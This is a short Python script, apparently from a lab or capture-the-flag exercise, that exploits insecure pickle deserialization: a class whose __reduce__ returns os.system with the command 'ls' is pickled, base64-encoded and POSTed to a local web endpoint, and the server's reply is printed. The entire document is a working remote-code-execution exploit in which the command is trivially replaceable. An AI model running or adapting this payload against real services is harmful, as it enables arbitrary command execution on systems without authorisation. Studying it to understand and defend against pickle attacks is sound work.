import requests
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        cmd = ('ls')
        return os.system, (cmd,)

url = "http://localhost:8080/peko"
encoded = pickle.dumps(RCE())
b64 = base64.urlsafe_b64encode(encoded)
response = requests.post(url, data={'pickled': b64})
print(response.text)